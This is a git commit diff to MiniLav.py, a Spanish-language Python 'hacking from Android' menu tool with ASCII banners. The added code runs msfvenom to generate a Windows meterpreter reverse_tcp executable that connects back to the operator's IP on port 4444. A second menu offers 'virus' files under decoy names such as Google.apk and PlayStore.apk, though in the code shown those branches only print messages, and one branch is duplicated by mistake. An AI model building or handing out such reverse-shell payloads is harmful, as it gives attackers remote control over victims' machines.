d90ccaee5e2762873ce233ef82f650a410842626
74lg0 <111157836+74lg0@users.noreply.github.com>
2022-12-08 14:14:48 -0600

    Update MiniLav.py

--- MiniLav.py
+++ MiniLav.py
@@ -43,45 +43,87 @@ print("´´´´¶¶¶´´´´´¶¶¶¶¶´´´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶�
 print("´´´´´´¶¶´´´¶¶¶´´´´´´´´´´´¶¶¶¶¶¶¶¶¶´´´´´´´´´´´¶¶¶´´´¶¶´´´´´´")
 print("´´´´´´¶¶´´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´¶¶´´´´´´")
 print("´´´´´´´¶¶¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶¶¶´´´´´´´")
-print("´´´´´´´´´´´´´´´´´´´´´"+ Fore.RED+ "Creador:74lg0" + Fore.BLUE+ "´´´´´´´´´´´´´´´´´´´´´´´")
-print("´´´´´´´´´´´´´´´´´´´´´"+ Fore.RED+ "Version:1.0"+Fore.BLUE+ "´´´´´´´´´´´´´´´´´´´´´´´´´´´")
-print("´´´´´´´´´´´´´´´´´´´´´"+ Fore.RED+ "Hackeando desde android"+ Fore.BLUE+ "´´´´´´´´´´´´´´´")
+print("´´´´´´´´´´´´´´´´´´´´´"+ Fore.RED+ "Creador:"+ Fore.GREEN+ "74lg0" + Fore.BLUE+ "´´´´´´´´´´´´´´´´´´´´´´´")
+print("´´´´´´´´´´´´´´´´´´´´´"+ Fore.RED+ "Version:"+ Fore.BLUE+ "1.0"+Fore.BLUE+ "´´´´´´´´´´´´´´´´´´´´´´´´´´´")
+print("´´´´´´´´´´´´´´´´´´´´´"+ Fore.YELLOW+ "Hackeando desde android"+ Fore.BLUE+ "´´´´´´´´´´´´´´´")
 
 #----------------Menu-------------
+#Nota: int(input()) te toma un numero literal, input() te lo toma como string
 
 print(Fore.RED+ "[1]" + Fore.YELLOW+ "Viruz acceso al dispositivo" , Fore.RED+ "\n[2]"+ Fore.YELLOW+ "Viruz elimina todo")
 eleccion=int(input(Fore.YELLOW+ "~~~Elije una opcion: "))
 
-#----------------Options1----------
+#----------------Options1 and banner2----------
 
 if eleccion == 1:
     system("clear")
+    print("")
+    print("")
+    print(Fore.RED+ "          .n                     .             .                n.")
+    print("     .n                     .             .                n.")
+    print("  . .dP                   dP               9b               9b   .")
+    print(" 4  qXb         .        dX                 Xb       .      dXp   t")
+    print("dX.  9Xb      .dXb     __                     __    dXb.   dXP   .Xb")
+    print("9XXb._     _.dXXXXb dXXXXbo.               dXXXXb dXXXXb._   _.dXXP")
+    print(" 9XXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXP")
+    print("   9XXXXXXXXXXXXXXX ~   ~ OOO8b   d8OOO ~   ~ XXXXXXXXXXXXXXXXXP")
+    print("     9XXXXXP   9XX      "+ Fore.YELLOW+ "*     " + Fore.RED+ "98v8P" + Fore.YELLOW+"      *     "+ Fore.RED+ "XXP   9XXXXXXXP")
+    print("      ~~~       9X.          .db|db.          .XP       ~~~")
+    print("                  )b.  .dbo.dP' v  9b.odb.  .dX(")
+    print("                ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.")
+    print("               dXXXXXXXXXXXP'   .    9XXXXXXXXXXXb")
+    print("             dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb")
+    print("             9XXb'    XXXXXb.dX|Xb.dXXXXX'    dXXP")
+    print("                       9XXXXXX(   )XXXXXXP")
+    print("                       XXXX X. v .X XXXX")
+    print("                        XP^X' b   d' X^XX")
+    print("                        X. 9         P )X")
+    print("                         b          '  d'")
+    print(Fore.RED+ "                          Creador:"+ Fore.YELLOW+ "74lg0")
+    print(Fore.RED+ "                          Version:"+ Fore.BLUE+ "1.0")
+    print(Fore.YELLOW+ "                        Hacking MetaSploit")
+    
+
+    print(Fore.YELLOW+ "\n------------------------------------------")
+    print("Nota:El archivo solo funciona para windows")
+    print("------------------------------------------")
     print("Jenerando archivo...")
-    print("Archivo creado")
-    eleccionarch=input("Mover a: ")
-    print(Fore.RED+ "Movido a "+ Fore.GREEN+ str(eleccionarch))
+    eleccionmeta=input(Fore.GREEN+ "Ingresa tu IP privada: ")
+    eleccionmeta2=input("Ingresa el nombre del archivo junto con el nombre de su extencion --> .exe ")
+    system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + eleccionmeta + " LPORT=4444 -f exe >" + eleccionmeta2)
 
 #----------------Options2----------
 
 elif eleccion == 2:
     system("clear")
     print("")
-    print(Fore.RED+ "[1]"+ Fore.YELLOW+ "Android" , Fore.RED+ "\n[2]"+ Fore.YELLOW+ "Windows")
-    eleccion2=int(input("Elije una opcion: "))
-    if eleccion2 == 1:
+    print(Fore.RED+ "[1]" + Fore.YELLOW+ "Google.apk" , Fore.RED+ "\n[2]" + Fore.YELLOW+ "PlayStore.apk" , Fore.RED+ "\n[3]"+ Fore.YELLOW+ "Termux.apk")
+    eleccionarch=int(input(Fore.RED+ "~~Elige una opcion: "))
+#-------Options2 and opcion1-------
+    if eleccionarch == 1:
         system("clear")
         print("")
-        print("Jenerando archivo...")
-        print("archivo Jenerando")
-        eleccionarch1=input("Mover a: ")
-        print(Fore.RED+ "Movido a "+ Fore.GREEN+ str(eleccionarch1))
-    elif eleccion2 == 2:
+        elecciondirectorio=input(Fore.YELLOW+ "Mover a: ")
+        print(Fore.RED+ "Archivo movido a " + Fore.YELLOW+ elecciondirectorio)
+#-----Options2 and opcion2----------
+    elif eleccionarch == 2:
         system("clear")
         print("")
-        print("Jenerando archivo...")
-        print("archivo jenerado")
-        eleccionarch2=input("Mover a: ")
-        print(Fore.RED+ "Movido a "+ Fore.GREEN+ str(eleccionarch2))
+        elecciondirectorio1=input(Fore.YELLOW+ "Mover a: ")
+        print(Fore.RED+ "Archivo movido a " + Fore.YELLOW+ elecciondirectorio1)
+
+#-----Options2 and opcion3----------
+
+    elif eleccionarch == 2:
+        system("clear")
+        print("")
+        elecciondirectorio2=input(Fore.YELLOW+ "Mover a: ")
+        print(Fore.RED+ "Archivo movido a " + Fore.YELLOW+ elecciondirectorio2)
+
+#---------Invalid Options----------
+    
+    else:
+        print("Elije una opcion valida...")
 
 #---------Invalid Options----------
 
@@ -89,4 +131,4 @@ else:
     system("clear")
     print("")
     print("")
-    print(Fore.YELLOW+ "elije una opcion valida y vuelve a intentarlo" , Fore.RED+ "\n:>")
+    print(Fore.YELLOW+ "elije una opcion valida y vuelve a intentarlo" , Fore.BLUE+ "\n:>")
